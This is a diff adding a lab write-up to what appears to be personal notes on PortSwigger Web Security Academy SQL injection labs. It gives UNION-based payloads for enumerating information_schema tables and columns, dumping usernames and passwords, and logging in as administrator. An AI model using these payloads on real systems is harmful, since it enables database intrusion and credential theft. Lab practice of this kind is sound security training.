@@ -126,6 +126,17 @@ There is a built-in table on Oracle called DUAL which you can use for this purpo
    
    `'+UNION+SELECT+NULL,@@version+FROM+DUAL#`
    
-   
-   
+[9.Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
+
+ 1. *Solutions*
+ 
+   As we can see the Database respond for  `'+UNION+SELECT+NULL,NULL--` that is mean there are tow tables.
+   By usin payload `'+UNION+SELECT+'abc','xyz'--` we can get that both tables have string values.
+   use payload `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.columns-- ` to get table name `users_xxxx`
+   use payload `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='USERS_ABCDEF'--` o retrieve the details of the columns in the table (replacing the table name) in my case is `users_ggighe` you can get that by search in bottom right filed in Burp Suite using `users`
+    By using `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ggighe'--` you can see the user_xxxx and password_xxxx
+    now change the column by user_xxx,password_xxxx.by using `'+UNION+SELECT+username_xxxx,+password_xxxx+FROM+users_xxxx--`
+    then search by administrator and get the password
+    finally loging using administrator and its password
+    
    
